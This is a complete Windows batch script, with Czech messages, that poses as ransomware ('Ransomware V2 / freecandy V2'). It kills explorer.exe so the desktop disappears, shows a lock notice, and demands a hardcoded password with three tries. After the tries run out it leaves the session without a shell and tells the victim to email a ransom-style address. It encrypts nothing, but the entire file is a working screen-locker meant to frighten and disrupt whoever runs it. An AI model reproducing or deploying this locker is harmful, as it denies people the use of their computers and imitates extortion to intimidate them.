@echo off
taskkill /f /im explorer.exe
:resett
cls
color a
echo Tvuj PC byl zamknut pomoci Ransomware V2 (a.k.a. freecandy V2)
echo Pro odemceni se zeptejte osoby, ktera tento program spustila.
pause

setlocal enabledelayedexpansion

set "password=LMAOlocker"
set "attempts=3"

:reset
cls
set /p "heslo=Zadejte heslo: "
set /a "attempts-=1"

if "!heslo!" == "!password!" (
    cls
    echo Uspesne odemceni!
    echo.
    start explorer.exe
    echo.
    echo.
    pause
    exit
) else (
    if !attempts! gtr 0 (
        echo Nespravne heslo. Zbyva vam !attempts! pokusu.
        echo.
        pause
        goto reset
    ) else (
        echo Vsechny pokusy byly vycerpany. Uzamknuto. Pro odemceni napiste na hakransom@post.cz
        echo.
        pause
        exit
    )
)

